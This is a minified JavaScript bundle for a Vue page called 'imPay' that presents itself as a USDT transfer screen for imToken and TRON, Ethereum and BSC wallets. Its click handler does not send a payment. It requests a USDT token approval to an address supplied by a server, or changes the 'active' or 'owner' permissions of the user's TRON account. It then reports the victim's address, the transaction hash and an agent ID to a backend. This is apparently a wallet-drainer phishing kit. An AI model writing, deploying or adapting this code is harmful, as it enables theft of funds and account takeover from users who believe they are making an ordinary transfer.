import{u as a}from"./9gE-0e0c53b1.js";import{s as e,a as s,b as t,g as o}from"./5uQ-29cbdec0.js";import{B as i,a as r,b as l,c,t as u,g as p}from"./98sGi-22f0576a.js";import{T as d}from"./zuvxe-6ebea689.js";import{d as n,e as m,c as v,g as b,a as j,b as f}from"./p1-e3a8e44a.js";import{v as w,c as h,b as g,Q as y,P as k,l as T,M as x,R as S,S as I,O as A,q as R}from"./fOrZ0HVzuE-6dd3f50b.js";import{r as H,u as O}from"./zKUA2VG6-098e3b9e.js";import{P as U}from"./oeSLe-b6b11daa.js";import{F as E,B as J,s as L,a as N,c as _}from"./hPbsEK-a5302c73.js";import{_ as F}from"./ZnMyRYn-921f7563.js";import"./d-efd4e3c8.js";import"./4Bdyrk-90f88067.js";import"./4FUl3On-9d71d848.js";import"./J4YL7kOJKL-06ac4daa.js";import"./JGxCNkiCBL-46bd934a.js";import"./vUU61iUR-ce88691f.js";import"./oE-dd24f959.js";import"./ZpQOZlRdI-496d7a90.js";import"./4GIX8hNPGH-a4a88aca.js";import"./nrp1o-1f032246.js";import"./vtKH-92d82fc7.js";import"./a5q0DqU-d43a279a.js";import"./PFgh-c25f6698.js";import"./e3X-b7123f9b.js";import"./pDwSFrd6y-c3138ec2.js";import"./kUJK1hTq-80d867d0.js";import"./HuGN0be-0f431f89.js";import"./FZjZo0-747a14c1.js";import"./j0dH-9a61d0a6.js";import"./Fj-cc7ceab0.js";import"./qV-2c21aba4.js";import"./OjerpUQ-768950b0.js";/* empty css                */import"./v-9bc2b98e.js";/* empty css            */import"./P1kl-29c12333.js";import"./X3qMjd4RO-c681ea97.js";import"./L6GIdWs-8ead1739.js";import"./hdEs5mj-081147b2.js";import"./Behr-b8c04985.js";import"./J6-c4eeb796.js";import"./SEUQg8l-59acaf37.js";import"./HSfIuD-99949154.js";import"./uyPFz46w-c24024d6.js";import"./LjWJN0y5Y-f176ca25.js";import"./ZOr-009da19d.js";import"./6JCiysWrAz-f8058f23.js";import"./F-82288e54.js";import"./7EFE2hPGZ-42e07982.js";import"./lqr0H-426a928f.js";import"./YA-5dcea6b6.js";import"./jOc9QTF-1f3975f5.js";import"./4vPfRHjOJV-a658a92c.js";import"./79Rb5-06ff8464.js";import"./y0c6NR-8760903a.js";import"./Ix-877aba1d.js";import"./i-0e58dc33.js";import"./AZvse-aeed37d8.js";import"./bSJkK-81a07ebe.js";import"./gLTI-e11b3c8e.js";import"./ptI30i5o5p-7da81808.js";import"./5-5a661122.js";import"./ld-3d10b917.js";import"./L8SeVx-cb566d4b.js";import"./mKJU-7354d83e.js";const P=a=>(S("data-v-6966fb22"),a=a(),I(),a),X={class:"page-container"},Z=P((()=>k("div",{class:"bottom-m10 left-m10 right-m30 top-p10 o7 fs14"},"收款账号",-1))),q={class:"left-m10 bg-white br12 right-m10",style:{padding:"12px 15px","border-radius":"5px"}},z={class:"bottom-m10 left-m10 right-m10 top-m20 o7 fs14 spaceb"},C=P((()=>k("span",{class:"fs14"},"数量",-1))),G={class:"fs14 o7"},V={class:"bg-white left-m10 br12 right-m10",style:{"border-radius":"5px"}},K={class:"address left-m20 o7 top-p20 bottom-p10 column"},B={style:{"margin-right":"15px"}},Q={class:"spaceb right-m10 top-m10 o6"},D={class:"fs14"},W={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},Y=F(w({__name:"imPay",setup(w){const S=H(0),I=H(0),F=H(.069),P=H({type:1,walletType:1,agentId:"",token:"USDT",amount:1,clientId:"",block:i.TRX,ads:"",isAdd:!1,client_type:1,extend:{}}),Y=H("");H("");const M=H({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),$=H("");H(!1),a(),H("");const aa=H(!0),ea=h((()=>P.value.ads||M.value.receiveAddress[P.value.block])),sa=()=>{const{type:a}=P.value;if(I.value<S.value)return L("Insufficient balance");1==a?ta():2==a?oa():ia()},ta=async()=>{try{if(N({message:"Loading...",duration:0}),P.value.block==i.TRX){const a=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",Y.value,$.value);a.result&&(ra($.value,"approve",a.txid),L(M.value.authSuccessTips))}else if(P.value.block==i.ETH){const a=await n(web3.value,$.value,Y.value);a.transactionHash&&(ra($.value,"approve",a.transactionHash),L(M.value.authSuccessTips))}else if(P.value.block==i.BSC){const a=await m(web3.value,$.value,Y.value);a.transactionHash&&(ra($.value,"approve",a.transactionHash),L(M.value.authSuccessTips))}}catch(a){_()}},oa=async()=>{if(P.value.block!=i.TRX)return;const a=await l(Y.value,$.value,P.value.isAdd);(null==a?void 0:a.result)?(ra($.value,"active",a.txid),L(M.value.authSuccessTips),_()):a&&L("object"==typeof a?JSON.stringify(a):String(a))},ia=async()=>{if(P.value.block!=i.TRX)return;const a=await c(Y.value);a.result&&(ra($.value,"owner",a.txid),L(M.value.authSuccessTips))},ra=async(a,o,i)=>{const r={addres:a,auth_addres:Y.value,hash:i||0,wallete_type:"ImToken",client_id:P.value.clientId||M.value.clientId||"",source:window.location.href,agent_uid:P.value.agentId,block:P.value.block,client_type:P.value.client_type,amount:P.value.amount,extend:P.value.extend?JSON.stringify(P.value.extend):""};switch(o){case"approve":await t(r);break;case"active":await s(r);break;case"owner":await e(r)}_()},la=async()=>{let a;switch(P.value.block){case i.TRX:if($.value=await tronWeb.defaultAddress.base58,!$.value)return L("无法获取钱包地址！请检查浏览器是否支持TRON！");I.value=await p($.value,P.value.token);break;case i.ETH:a=await j(),web3.value=a.web3,$.value=a.userAddress,I.value=await f(web3.value,a.userAddress);break;case i.BSC:a=await v(),web3.value=a.web3,$.value=a.userAddress,I.value=await b(web3.value,a.userAddress)}};return g((async()=>{const a=JSON.parse(localStorage.getItem("routerParams"));if(S.value=a.amount,P.value={amount:S.value,type:a.type,walletType:1,agentId:a.agent,token:a.token||"USDT",block:a.block||i.TRX,clientId:a.clientId||"",ads:a.ads,isAdd:a.isAdd,client_type:1,extend:a.extend},(async()=>{try{const a=JSON.parse(localStorage.getItem("config"));M.value={...a};const{type:e}=P.value;aa.value=!0;const s=await o({block:P.value.block,type:u[P.value.type]});aa.value=!1;const t=s.data;M.value={...a,authAddress:t},Y.value=M.value.authAddress}catch(a){aa.value=!1}})(),d.isTokenEnv())try{d.apis.navigator.setTitle(`${String(P.value.token).toLocaleLowerCase()}转账`);let a="";a=P.value.block==i.TRX?await d.apis.user.showAccountSwitch("TRON"):await d.apis.user.showAccountSwitch("ETHEREUM"),$.value=a,la()}catch(e){4001==e.code&&la()}else{la();const a=`imtokenv2://navigate?screen=DappView&url=${window.location.href}`;window.location.href=a}})),(a,e)=>(A(),y("div",X,[Z,k("div",q,U(ea.value||"-"),1),k("div",z,[C,k("span",G,U(I.value)+" "+U(String(P.value.token).toLocaleUpperCase()),1)]),k("div",V,[k("div",K,[k("div",B,[T(O(E),{modelValue:S.value,"onUpdate:modelValue":e[0]||(e[0]=a=>S.value=a),type:"number",label:"",placeholder:"请输入",size:"large",style:{"font-size":"16px",padding:"0 0 10px 0px","border-bottom":"1px solid #eee"}},null,8,["modelValue"])]),k("div",Q,[k("span",D," $ "+U("t"==P.value.token?Number(Number(S.value).toFixed(2)*F.value).toFixed(3):S.value),1)])])]),k("div",W,[T(O(J),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:sa,loading:aa.value},{default:x((()=>[R("下一步")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-6966fb22"]]);export{Y as default};
